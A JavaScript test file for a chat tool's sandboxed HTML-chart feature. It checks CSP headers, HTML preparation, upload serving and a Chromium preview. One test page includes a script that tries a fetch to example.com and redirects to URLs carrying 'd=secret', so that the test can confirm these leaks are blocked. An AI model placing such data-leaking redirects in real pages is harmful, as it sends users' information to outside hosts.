import test from 'node:test'
import assert from 'node:assert/strict'
import { mkdtemp, rm } from 'node:fs/promises'
import { tmpdir } from 'node:os'
import { join } from 'node:path'
import {
  checkVisualHtml, prepareVisualHtml, previewVisual, storeVisual, renderedResult, VISUAL_RULES, visualToolDescriptors, visualTitle, clampVisualHeight,
  PREVIEW_TOOL, RENDER_TOOL, VISUAL_CSP, VISUAL_MAX_CHARS,
} from './visuals.mjs'
import { readFileSync } from 'node:fs'
import { createUploadStore, servedHeaders } from './uploads.mjs'
import { applyEvent } from './turn.mjs'
import { normalizePart } from './store.mjs'
import { describeMcpCall } from './tools.mjs'
import { createBrowserManager, findChromium } from '../browser/manager.mjs'

const PAGE = '<!doctype html><html><head><title>t</title></head><body><div style="height:240px">chart</div></body></html>'

test('the bootstrap goes first in <head>, never inside a script or comment', () => {
  const out = prepareVisualHtml(PAGE)
  assert.ok(out.startsWith('<!doctype html><html><head><meta charset="utf-8">'))
  assert.ok(out.indexOf('id="totem-theme"') < out.indexOf('<title>'))
  const tricky = '<!-- <head> --><script>var s = "<head>"</script><p>hi</p>'
  const t = prepareVisualHtml(tricky)
  assert.ok(t.startsWith('<!doctype html><head>'), 'no <head> outside inert content: one is made at the start')
  assert.ok(t.endsWith(tricky))
  // A page with its own charset and viewport keeps them, without a second copy.
  const own = prepareVisualHtml('<html><head><meta charset="utf-8"><meta name="viewport" content="width=500"></head></html>')
  assert.equal(own.match(/charset/g).length, 1)
  assert.equal(own.match(/name="viewport"/g).length, 1)
})

test('pages sized from the viewport, empty pages and oversized pages are refused', () => {
  assert.match(checkVisualHtml(''), /required/)
  assert.match(checkVisualHtml('<style>.c{height:60vh}</style>'), /vh, vb, vmax or a cq unit/)
  assert.match(checkVisualHtml('<div style="min-height: 100dvh">'), /vh, vb, vmax or a cq unit/)
  assert.match(checkVisualHtml('<style>.c{height:50vmax}</style>'), /vh, vb, vmax or a cq unit/)
  assert.match(checkVisualHtml('<style>.c{block-size:80svb}</style>'), /vh, vb, vmax or a cq unit/)
  assert.match(checkVisualHtml('<style>.c{height:50dvmax}</style>'), /vh, vb, vmax or a cq unit/)
  assert.match(checkVisualHtml('<style>.c{height:100cqh}</style>'), /vh, vb, vmax or a cq unit/)
  assert.equal(checkVisualHtml('<style>.c{height:300px;width:50vw;font-size:2vmin}</style><p>a 100vh word in text is fine</p>'), '')
  assert.match(checkVisualHtml('x'.repeat(VISUAL_MAX_CHARS + 1)), /limit/)
})

test('the served policy sandboxes the page and allows only the chart CDNs', () => {
  assert.match(VISUAL_CSP, /^sandbox allow-scripts allow-popups allow-popups-to-escape-sandbox;/)
  assert.doesNotMatch(VISUAL_CSP, /allow-same-origin/)
  assert.match(VISUAL_CSP, /connect-src 'none'/)
  assert.match(VISUAL_CSP, /img-src data: blob:;/)
  assert.match(VISUAL_CSP, /script-src [^;]*https:\/\/cdn\.jsdelivr\.net/)
})

test('scans over agent HTML stay fast on a page built to slow them', () => {
  const t0 = Date.now()
  for (const s of ['<meta ', '<head ', '<html ', '<template ', '<style ', '<script ', '<!--', 'style="']) {
    const html = s.repeat(Math.floor(VISUAL_MAX_CHARS / s.length))
    checkVisualHtml(html)
    prepareVisualHtml(html)
  }
  // Unbounded attribute scans took ~45 s on one of these; the bridge has one thread.
  assert.ok(Date.now() - t0 < 3000, `took ${Date.now() - t0} ms`)
})

test('uploads are served inline only when safe, and a chart page only under its policy', () => {
  const visual = servedHeaders({ name: 'Mileage.html', mime: 'text/html', visual: true })
  assert.equal(visual['content-type'], 'text/html; charset=utf-8')
  assert.match(visual['content-disposition'], /^inline;/)
  assert.equal(visual['content-security-policy'], VISUAL_CSP)
  // The owner's own HTML, or one claiming `visual` with another type, is a download.
  for (const meta of [{ name: 'mine.html', mime: 'text/html' }, { name: 'x.svg', mime: 'image/svg+xml', visual: true }, { name: 'a.html', mime: 'text/html', visual: 'yes' }]) {
    const h = servedHeaders(meta)
    if (meta.mime === 'text/html') assert.match(h['content-disposition'], /^attachment;/, meta.name)
    assert.notEqual(h['content-security-policy'], VISUAL_CSP, meta.name)
  }
  // An SVG can carry script: inline, but never with Totem's origin.
  assert.equal(servedHeaders({ name: 'x.svg', mime: 'image/svg+xml' })['content-security-policy'], 'sandbox')
  assert.equal(servedHeaders({ name: 'a.png', mime: 'image/png' })['content-security-policy'], 'sandbox')
  // A PDF keeps the browser's viewer, which a sandbox would block.
  const pdf = servedHeaders({ name: 'a.pdf', mime: 'application/pdf' })
  assert.match(pdf['content-disposition'], /^inline;/)
  assert.equal(pdf['content-security-policy'], undefined)
  assert.match(servedHeaders({ name: 'Mileage.html', mime: 'text/html', visual: true }, { download: true })['content-disposition'], /^attachment;/)
})

test('the dashboard frame asks for no more than the served sandbox allows', () => {
  const web = readFileSync(new URL('../web/src/chat/visuals.ts', import.meta.url), 'utf8')
  const frame = /VISUAL_SANDBOX = '([^']*)'/.exec(web)[1].split(/\s+/)
  const served = VISUAL_CSP.split(';')[0].replace(/^sandbox\s+/, '').split(/\s+/)
  for (const flag of frame) assert.ok(served.includes(flag), flag)
  assert.ok(!frame.includes('allow-same-origin'))
  // The bootstrap's messages are the ones the frame reads.
  for (const name of ['totem-visual:size', 'totem-visual:open']) {
    assert.ok(web.includes(`'${name}'`), name)
    assert.ok(prepareVisualHtml('<p>x</p>').includes(JSON.stringify(name)), name)
  }
})

test('the chart tools come as a pair, with the grant', () => {
  assert.deepEqual(visualToolDescriptors({ visual: null }), [])
  assert.deepEqual(visualToolDescriptors({ visual: () => {} }).map((t) => t.name), [PREVIEW_TOOL, RENDER_TOOL])
  for (const t of visualToolDescriptors({ visual: () => {} })) {
    assert.equal(t.annotations.readOnlyHint, true)
    assert.ok(t.inputSchema.required.includes('html'))
  }
  assert.match(VISUAL_RULES, new RegExp(`${PREVIEW_TOOL}.*${RENDER_TOOL}`))
})

test('titles and heights are made safe', () => {
  assert.equal(visualTitle('  Weekly‮mileage\n'), 'Weekly mileage')
  assert.equal(visualTitle(''), 'Chart')
  assert.equal(clampVisualHeight(5), 80)
  assert.equal(clampVisualHeight(99999), 2000)
  assert.equal(clampVisualHeight('x'), 320)
})

test('html_render stores the prepared page as a visual upload and the part survives a save', async () => {
  const dir = await mkdtemp(join(tmpdir(), 'visuals-'))
  try {
    const uploads = createUploadStore({ dir, secret: 's' })
    const made = await storeVisual({ html: PAGE, title: 'Weekly mileage', height: 310 }, { uploads })
    assert.equal(made.part.type, 'visual')
    assert.equal(made.part.height, 310)
    const file = await uploads.read(made.part.uploadId)
    assert.equal(file.meta.visual, true)
    assert.equal(file.meta.mime, 'text/html')
    assert.match(file.buffer.toString('utf8'), /id="totem-theme"/)
    // An owner's own HTML upload is never marked as a page to serve.
    const own = await uploads.save({ buffer: Buffer.from(PAGE), name: 'mine.html', mime: 'text/html' })
    assert.equal((await uploads.meta(own.id)).visual, undefined)

    const refused = await storeVisual({ html: '<style>a{height:1vh}</style>', title: 'x', height: 100 }, { uploads })
    assert.match(refused.error, /vh, vb, vmax or a cq unit/)

    // Live event → reply part (no signed url kept) → normalised on save.
    const msg = { role: 'assistant', parts: [] }
    const event = { type: 'visual', visual: { ...made.part, url: '/api/chat/uploads/x?sig=y' } }
    applyEvent(msg, event)
    applyEvent(msg, event)
    assert.equal(msg.parts.length, 1)
    assert.equal(msg.parts[0].url, undefined)
    assert.deepEqual(normalizePart(msg.parts[0]), { type: 'visual', id: made.part.id, uploadId: made.part.uploadId, title: 'Weekly mileage', height: 310 })
    assert.equal(normalizePart({ type: 'visual', uploadId: '../x' }), null)

    assert.match(renderedResult(made.part).content[0].text, /Don't mention or describe it/)
  } finally {
    await rm(dir, { recursive: true, force: true })
  }
})

test('chart calls read as steps, not as page source', () => {
  const html = '<html>…</html>'
  assert.deepEqual(
    { title: describeMcpCall({ name: 'mcp__totem-browser__html_preview', input: { html } }).title, input: describeMcpCall({ name: 'mcp__totem-browser__html_preview', input: { html } }).input },
    { title: 'Checked the chart', input: '' },
  )
  const viaGateway = describeMcpCall({ name: 'browser__html_render', server: 'totem-gateway', input: JSON.stringify({ html, title: 'Mileage' }) })
  assert.equal(viaGateway.title, 'Showed a chart')
  assert.equal(viaGateway.detail, 'Mileage')
  assert.equal(viaGateway.tool, 'html_render')
})

test('a preview that cannot run says so and points at html_render', async () => {
  const r = await previewVisual({ html: PAGE }, { renderPage: async () => { throw new Error('no Chromium') } })
  assert.equal(r.isError, true)
  assert.match(r.content[0].text, /no Chromium.*html_render/)
  const bad = await previewVisual({ html: '' }, { renderPage: async () => assert.fail('not called') })
  assert.equal(bad.isError, true)
})

// The real thing, where this machine has Chromium: a screenshot, a height that
// matches the page, and the policy enforced (an inline script runs; fetch does not).
test('html_preview renders the page in Chromium under the served policy', { skip: !findChromium() && 'no Chromium here' }, async () => {
  const manager = createBrowserManager({})
  try {
    const html = '<!doctype html><html><head></head><body><div id="c" style="height:300px;background:var(--chart-1)"></div>'
      + '<script>console.log("ran:" + getComputedStyle(document.documentElement).getPropertyValue("--chart-1").trim());fetch("https://example.com/x").catch(()=>console.log("fetch blocked"));'
      + 'setTimeout(()=>{location.href="https://example.com/?d=secret"},50)</script></body></html>'
    const r = await previewVisual({ html, width: 400 }, { renderPage: manager.renderPage })
    assert.equal(r.isError, undefined, r.content?.[0]?.text)
    assert.equal(r.structuredContent, undefined, 'Codex would send only structuredContent and drop the image')
    const info = JSON.parse(r.content[0].text)
    // 300px of content plus the 8px gutter on each side.
    assert.equal(info.contentHeight, 316)
    assert.equal(info.width, 400)
    const logs = info.consoleMessages.map((m) => m.text).join('\n')
    assert.match(logs, /ran:#5b8cff/)
    assert.match(logs, /fetch blocked/)
    // Leaving the page is the one request CSP cannot stop; the preview refuses it.
    assert.match(logs, /navigation blocked: https:\/\/example\.com\/\?d=secret/)
    assert.equal(r.content[1].type, 'image')
    assert.ok(Buffer.from(r.content[1].data, 'base64').subarray(0, 4).equals(Buffer.from([0x89, 0x50, 0x4e, 0x47])))

    // A page that navigates while it loads (before 'load' fires) still comes back
    // promptly, with the refusal in its console, not as a 20-second timeout.
    const t0 = Date.now()
    const sync = await previewVisual({ html: '<div style="height:200px">chart</div><script>location.href="https://example.com/leak"</script>' }, { renderPage: manager.renderPage })
    assert.equal(sync.isError, undefined, sync.content?.[0]?.text)
    assert.ok(Date.now() - t0 < 8000, `took ${Date.now() - t0} ms`)
    assert.match(sync.content[0].text, /navigation blocked: https:\/\/example\.com\/leak/)
  } finally {
    await manager.closeAll()
  }
})
